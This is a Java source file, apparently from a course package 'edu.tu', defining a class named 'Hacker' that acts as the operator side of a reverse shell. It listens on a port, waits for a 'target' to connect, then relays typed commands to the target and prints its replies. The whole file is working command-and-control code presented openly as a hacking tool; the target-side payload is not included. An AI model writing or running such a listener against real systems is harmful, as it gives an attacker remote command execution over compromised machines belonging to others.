package edu.tu;

import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

public class Hacker {

	private Socket socket = null;
	private ServerSocket server = null;
	private DataInputStream streamIn = null;
	private DataOutputStream streamOut = null;
	private DataInputStream console = null;
	
	public Hacker(int port) {
		try {
			System.out.println("Binding to port " + port + ", please wait  ...");
			server = new ServerSocket(port);
			System.out.println("Hacker started: " + server);
			System.out.println("Waiting for a target ...");
			socket = server.accept();
			System.out.println("Target accepted: " + socket);
			String target = "*** " + socket.getLocalAddress().getHostName() + ":" + socket.getLocalAddress().getHostAddress() + " > \n";
			
			open();
						
			while ( true ) {
				try {
					System.out.print( target );
					String cmd = console.readLine();					
					if ( cmd.equals("exit") )
						break;
					
					streamOut.writeUTF( cmd );
					streamOut.flush();
					
					// read response
					String resp = streamIn.readUTF();
					System.out.println( "\n" + resp );
					
				} catch (IOException ioe) {
					System.out.println("Sending error: " + ioe.getMessage());
				}
			}
			
			close();
			
		} catch (IOException ioe) {
			System.out.println(ioe);
		}
	}

	public void open() throws IOException {
		console = new DataInputStream(System.in);
		streamIn = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
		streamOut = new DataOutputStream(socket.getOutputStream());
	}

	public void close() throws IOException {
		if (console != null)
			console.close();
		if (streamIn != null)
			streamIn.close();
		if (streamOut != null)
			streamOut.close();
		if (socket != null)
			socket.close();
	}

	public static void main(String args[]) {
		Hacker server = null;
		if (args.length != 1)
			System.out.println("Missing port argument: java edu.tu.Hacker port");
		else
			server = new Hacker(Integer.parseInt(args[0].trim()));
		
		System.out.println( "Hacker terminated");
	}
}
